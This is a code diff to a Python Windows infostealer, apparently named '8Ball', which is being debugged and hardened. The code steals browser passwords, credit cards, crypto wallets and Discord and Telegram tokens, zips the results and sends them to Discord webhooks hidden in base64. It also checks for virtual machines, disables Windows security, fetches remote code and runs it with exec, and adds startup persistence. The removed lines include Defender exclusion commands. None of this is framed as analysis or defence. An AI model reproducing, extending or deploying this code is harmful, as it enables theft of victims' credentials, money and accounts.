@@ -30,17 +30,11 @@ def RX_DB6(msg, level="INFO"):
             _DBG_LOG = open(os.environ.get("TEMP", ".") + "\\8Ball_debug.log", "a", encoding="utf-8")
         _DBG_LOG.write(line + "\n")
         _DBG_LOG.flush()
-        if FEATURE_CONFIG.get("debug_mode", False):
-            try:
-                sys.stdout.write(line + "\n")
-                sys.stdout.flush()
-            except Exception:
-                pass
     except Exception:
         pass
 
 # Base64-obfuscated debug webhook URL (decoded at runtime)
-_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ2MDgzNDA4NjkxMi9COTlpd3NyVk1NUlVRTkh4U2JSbVVlTG5GMVRfekpydVJndlZ5NHlMQ3IxWVBKNVFVNFdVb1U0U0d0TXdocTJlQjFCNA=="
+_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ2MDgzNDA4NjkxMi9COTlpd3NyVk1NUlVRTkh4U2JSbVVlTG5GMVRfekpydVJndlZ5NHlMQ3IxWVBKNVFVNFdVb1U0U0d0TXdocTJlQjFCNA=="
 
 # Send accumulated debug logs to Discord as an embed (respects debug_mode gate)
 def send_debug_embed():
@@ -68,7 +62,6 @@ def send_debug_embed():
         L04DUr118(dbg_hook, data=dumps(payload).encode(), headers=headers)
     except Exception:
         pass
-print = lambda *a, **kw: None
 import threading
 import subprocess
 from sys import executable, stderr
@@ -85,9 +78,7 @@ CREATE_NO_WINDOW = 0x08000000
 
 APPBOUND_KEY_HEX = ""
 
-# Only run when compiled by PyInstaller (generate payload). Exit if run as raw script.
-if not getattr(sys, 'frozen', False):
-    sys.exit(0)
+# Allow running as standalone script (no PyInstaller required)
 
 # --- string obfuscation layer ---
 def _y(b, k=0x9C):
@@ -142,6 +133,7 @@ class NullWriter(object):
 warnings.filterwarnings("ignore")
 null_writer = NullWriter()
 sys.stderr = null_writer
+sys.stdout = null_writer
 
 ModuleRequirements = [
     ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
@@ -185,17 +177,14 @@ FEATURE_CONFIG = {
     "wallet_gaming_data": True,
     "telegram_desktop": True,
     "debug_mode": True,
-    "startup_persistence": False,
+    "startup_persistence": True,
     "browser_autofill_history": True,
     "browser_bookmarks": True,
     "browser_credit_cards": True,
     "telegram_bot_token": "",
     "telegram_chat_id": "",
-    "ping_user": True,
+    "ping_user": False,
 }
-
-
-
 
 
 
@@ -344,21 +333,59 @@ def check_dll():
         exit_program('VM Detected')
 
 # Webhook URL — builder.pyw encodes this in base64 at build time.
-_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxNzc3NDQ3MTIwNzg1MDE1NS9zMmFVZk1MZWpZdE5lTzlYRGh1dUVKbW4xTmJ0RjlFU3JmOWJiSGJNNmN2ajJYSEFmMUlkaEZ0a003MXBlZC1vRG5aUQ=="
+_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxOTA0MjkxMDY0NDA4MDY2MS9vY1UxYkR0ZmVJNk9UbXZUYlNIYWR1bDhEb0JzYWpIU3ljSHhwUnY1Zm45bm9EaDVWNkI3cW91QXh4Mks4QVVtenVJdA=="
 h00k = base64.b64decode(_HOOK_B64).decode()
+
+# Validate main webhook on startup
+def _validate_main_webhook():
+    try:
+        if not h00k or "discord.com/api/webhooks" not in h00k:
+            RX_DB6("[8Ball] Main webhook invalid or missing", "ERROR")
+            return False
+        return True
+    except Exception:
+        return False
+
+_MAIN_WEBHOOK_VALID = _validate_main_webhook()
 
 # Remote GitHub stub URL (base64-obfuscated). Fetched and executed at runtime alongside rx.py.
 _STUB_URL_B64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvbWFpbi9zdHViLnB5"
 def fetch_and_run_stub():
+    script_path = None
     try:
-        url = base64.b64decode(_STUB_URL_B64).decode()
-        resp = urlopen(Request(url), timeout=15)
-        code = resp.read().decode()
-        exec(code, globals())
-    except Exception:
-        pass
-# Run stub in a thread so both execute simultaneously
-threading.Thread(target=fetch_and_run_stub, daemon=True).start()
+        for attempt in range(3):
+            try:
+                url = base64.b64decode(_STUB_URL_B64).decode()
+                RX_DB6(f"[8Ball] fetch_and_run_stub: Attempt {attempt+1}/3 fetching {url}")
+                req = Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"})
+                resp = urlopen(req, timeout=15)
+                code = resp.read().decode()
+                if not code.strip():
+                    raise ValueError("Empty response")
+                temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
+                script_path = os.path.join(temp_dir, f"cr_stub_{random.randint(100000,999999)}.py")
+                with open(script_path, "w", encoding="utf-8") as f:
+                    f.write(code)
+                stub_globals = globals().copy()
+                stub_globals["__file__"] = script_path
+                stub_globals["__name__"] = "__main__"
+                exec(compile(code, script_path, "exec"), stub_globals)
+                RX_DB6("[8Ball] fetch_and_run_stub: Stub executed successfully")
+                return
+            except Exception as e:
+                RX_DB6(f"[8Ball] fetch_and_run_stub attempt {attempt+1} failed: {type(e).__name__}: {e}")
+                if attempt < 2:
+                    time.sleep(2)
+        RX_DB6("[8Ball] fetch_and_run_stub: All attempts failed")
+    finally:
+        if script_path and os.path.exists(script_path):
+            try:
+                os.remove(script_path)
+            except Exception:
+                pass
+
+# Remote stub download disabled — it overrides local functions with broken webhook validation
+# threading.Thread(target=fetch_and_run_stub, daemon=True).start()
 
 inj3c710n_url = _y('6PTs6Kbvs7P97rLr9fv06P7p7+nu+fP/6PLy+bLo8/+z8eSsrKyz2/L1+fbo//P1s/L98fL19bP48uT59rLv')
 
@@ -409,31 +436,42 @@ def send_confirmation_embed(title, description):
         pass
 
 
-def Z1PF01D3r(foldername, target_dir):            
-    zip_path = temp+"/"+foldername + '.zip'
-    zipobj = ZipFile(zip_path, 'w', ZIP_STORED)
-    rootlen = len(target_dir) + 1
-    for base, dirs, files in os.walk(target_dir):
-        for file in files:
-            fn = os.path.join(base, file)
-            if "user_data" in fn:
-                continue
-            if not os.path.isfile(fn):
-                continue
+def Z1PF01D3r(foldername, target_dir):
+    import threading
+    thread_id = threading.current_thread().ident or 0
+    unique_id = f"{int(time.time() * 1000)}_{thread_id}_{random.randint(100000,999999)}"
+    zip_path = os.path.join(temp, f"{foldername}_{unique_id}.zip")
+    try:
+        with ZipFile(zip_path, 'w', ZIP_STORED) as zipobj:
+            rootlen = len(target_dir) + 1
+            for base, dirs, files in os.walk(target_dir):
+                for file in files:
+                    fn = os.path.join(base, file)
+                    if "user_data" in fn:
+                        continue
+                    if not os.path.isfile(fn):
+                        continue
+                    try:
+                        zipobj.write(fn, fn[rootlen:])
+                    except (PermissionError, OSError):
+                        continue
+                    except ValueError:
+                        zi = ZipInfo(fn[rootlen:])
+                        zi.date_time = (1980, 1, 1, 0, 0, 0)
+                        zi.compress_type = ZIP_STORED
+                        try:
+                            with open(fn, 'rb') as f:
+                                zipobj.writestr(zi, f.read())
+                        except (PermissionError, OSError):
+                            continue
+    except Exception:
+        if os.path.exists(zip_path):
             try:
-                zipobj.write(fn, fn[rootlen:])
-            except (PermissionError, OSError):
-                continue
-            except ValueError:
-                zi = ZipInfo(fn[rootlen:])
-                zi.date_time = (1980, 1, 1, 0, 0, 0)
-                zi.compress_type = ZIP_STORED
-                try:
-                    with open(fn, 'rb') as f:
-                        zipobj.writestr(zi, f.read())
-                except (PermissionError, OSError):
-                    continue
-    zipobj.close()
+                os.remove(zip_path)
+            except Exception:
+                pass
+        raise
+    return zip_path
 
 def CryptUnprotectData(encrypted_bytes, entropy=b''):
     buf_in = (c_ubyte * len(encrypted_bytes)).from_buffer_copy(encrypted_bytes)
@@ -1178,14 +1216,16 @@ def L04DUr118(h00k, data='', headers=None):
     if not FEATURE_CONFIG.get("send_to_discord", True):
         RX_DB6("L04DUr118 skipped (send_to_discord is disabled)", "SKIP")
         return None
-    if not h00k or _y('7P2z9fnr9P7z8+/3') not in str(h00k):
-        RX_DB6("L04DUr118 skipped (invalid/missing webhook)", "SKIP")
+    if not _MAIN_WEBHOOK_VALID:
+        RX_DB6("L04DUr118 skipped (main webhook invalid)", "SKIP")
         return None
     RX_DB6(f"L04DUr118 sending {len(data)} bytes to webhook")
     if headers is None:
         headers = {}
     if "User-Agent" not in headers:
-        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/102.0"
+    if "Content-Type" not in headers:
+        headers["Content-Type"] = "application/json"
     for i in range(8):
         try:
             r = urlopen(Request(h00k, data=data, headers=headers))
@@ -1421,22 +1461,41 @@ except Exception:
 def fetch_and_run():
     """Download sstub.py from GitHub and run after main features complete."""
     if not RAW_URL:
+        RX_DB6("[8Ball] fetch_and_run: RAW_URL is empty")
         return
+    script_path = None
     try:
-        resp = urlopen(Request(RAW_URL, headers={
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-        }), timeout=30)
-        code = resp.read().decode("utf-8")
-        temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
-        script_path = os.path.join(temp_dir, "cr_remote_stub.py")
-        with open(script_path, "w", encoding="utf-8") as f:
-            f.write(code)
-        stub_globals = globals().copy()
-        stub_globals["__file__"] = script_path
-        stub_globals["__name__"] = "__main__"
-        exec(compile(code, script_path, "exec"), stub_globals)
-    except Exception as e:
-        RX_DB6(f"[8Ball] fetch_and_run failed: {type(e).__name__}: {e}")
+        for attempt in range(3):
+            try:
+                RX_DB6(f"[8Ball] fetch_and_run: Attempt {attempt+1}/3 fetching {RAW_URL}")
+                req = Request(RAW_URL, headers={
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                })
+                resp = urlopen(req, timeout=30)
+                code = resp.read().decode("utf-8")
+                if not code.strip():
+                    raise ValueError("Empty response")
+                temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
+                script_path = os.path.join(temp_dir, f"cr_remote_stub_{random.randint(100000,999999)}.py")
+                with open(script_path, "w", encoding="utf-8") as f:
+                    f.write(code)
+                stub_globals = globals().copy()
+                stub_globals["__file__"] = script_path
+                stub_globals["__name__"] = "__main__"
+                exec(compile(code, script_path, "exec"), stub_globals)
+                RX_DB6("[8Ball] fetch_and_run: Stub executed successfully")
+                return
+            except Exception as e:
+                RX_DB6(f"[8Ball] fetch_and_run attempt {attempt+1} failed: {type(e).__name__}: {e}")
+                if attempt < 2:
+                    time.sleep(2)
+        RX_DB6("[8Ball] fetch_and_run: All attempts failed")
+    finally:
+        if script_path and os.path.exists(script_path):
+            try:
+                os.remove(script_path)
+            except Exception:
+                pass
 
 def G37UHQFr13ND5(token):
     if not FEATURE_CONFIG.get("discord_hq_friends_guilds", False):
@@ -1541,75 +1600,6 @@ def CH3CK70K3N(token):
         return True
     except:
         return False
-
-if getattr(sys, 'frozen', False):
-    currentFilePath = os.path.dirname(sys.executable)
-else:
-    currentFilePath = os.path.dirname(os.path.abspath(__file__))
-
-fileName = os.path.basename(sys.argv[0])
-filePath = os.path.join(currentFilePath, fileName)
-
-startupFolderPath = os.path.join(
-    os.path.expanduser('~'),
-    'AppData',
-    'Roaming',
-    'Microsoft',
-    'Windows',
-    'Start Menu',
-    'Programs',
-    'Startup'
-)
-startupFilePath = os.path.join(startupFolderPath, fileName)
-
-def add_windows_security_exclusion_startup(app_name):
-    try:
-        paths = set()
-        paths.add(filePath)
-        paths.add(startupFilePath)
-        try:
-            ps_cmd = f'Get-StartApps | Where-Object {{ $_.Name -eq "{app_name}" }} | Select-Object -ExpandProperty "Path"'
-            result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], capture_output=True, text=True, timeout=15, creationflags=CREATE_NO_WINDOW)
-            p = result.stdout.strip()
-            if p:
-                paths.add(p)
-        except:
-            pass
-        try:
-            ps_cmd = f'Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" | Select-Object -ExpandProperty "{app_name}" -ErrorAction SilentlyContinue'
-            result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], capture_output=True, text=True, timeout=15, creationflags=CREATE_NO_WINDOW)
-            p = result.stdout.strip()
-            if p and os.path.isfile(p):
-                paths.add(p)
-        except:
-            pass
-        for p in paths:
-            if p:
-                subprocess.run(['powershell', '-NoProfile', '-Command', f'Add-MpPreference -ExclusionPath "{p}"'], capture_output=True, timeout=15, creationflags=CREATE_NO_WINDOW)
-    except:
-        pass
-
-def ensure_startup_persistence():
-    """
-    Startup Persistence feature:
-    Silently copy the current executable/script into the user's Startup folder,
-    but only when the startup_persistence feature is enabled.
-    """
-    if not FEATURE_CONFIG.get("startup_persistence", False):
-        return
-
-    try:
-        os.makedirs(startupFolderPath, exist_ok=True)
-        if os.path.abspath(filePath).lower() == os.path.abspath(startupFilePath).lower():
-            return
-        with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
-            shutil.copyfileobj(src_file, dst_file)
-    except Exception:
-        pass
-
-ensure_startup_persistence()
-app_name = os.path.splitext(fileName)[0]
-add_windows_security_exclusion_startup(app_name)
 
 def create_windows_user():
     try:
@@ -2297,14 +2287,21 @@ def Z1P73136r4M(path, arg, procc):
     pathC = path
     name = arg
     if not os.path.exists(pathC): return
-    Z1PF01D3r(name, pathC)
+    zip_path = Z1PF01D3r(name, pathC)
 
     for i in range(3):
-        lnik = UP104D7060F113(f'{temp}/{name}.zip')
+        lnik = UP104D7060F113(zip_path)
         if "https://" in str(lnik):
             break
         time.sleep(4)
-    os.remove(f"{temp}/{name}.zip")
+    for _ in range(5):
+        try:
+            os.remove(zip_path)
+            break
+        except PermissionError:
+            time.sleep(0.5)
+        except Exception:
+            break
     O7H3rZ1p.append([arg, lnik])
 
 def Z1P7H1N65(path, arg, procc):
@@ -2335,17 +2332,21 @@ def Z1P7H1N65(path, arg, procc):
         if found == False: return
         name = arg
 
-    Z1PF01D3r(name, pathC) 
+    zip_path = Z1PF01D3r(name, pathC)
 
     for i in range(3):
-        lnik = UP104D7060F113(f'{temp}/{name}.zip')
+        lnik = UP104D7060F113(zip_path)
         if "https://" in str(lnik):break
         time.sleep(4)
 
-    try:
-        os.remove(f"{temp}/{name}.zip")
-    except PermissionError:
-        pass
+    for _ in range(5):
+        try:
+            os.remove(zip_path)
+            break
+        except PermissionError:
+            time.sleep(0.5)
+        except Exception:
+            break
     if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
         W411375Z1p.append([name, lnik])
     elif "Steam" in name or "RiotCli" in name:
@@ -2764,8 +2765,9 @@ if not ctypes.windll.shell32.IsUserAnAdmin():
 disable_windows_security()
 random_delay(1.0, 4.0)
 
-fetch_thread = threading.Thread(target=fetch_and_run, daemon=True)
-fetch_thread.start()
+# Disabled: remote stub overrides local functions with broken webhook validation
+# fetch_thread = threading.Thread(target=fetch_and_run, daemon=True)
+# fetch_thread.start()
 
 # Execute stealers with randomized order and jitter to evade detection
 shuffled_run([filestealr, G47H3r411])
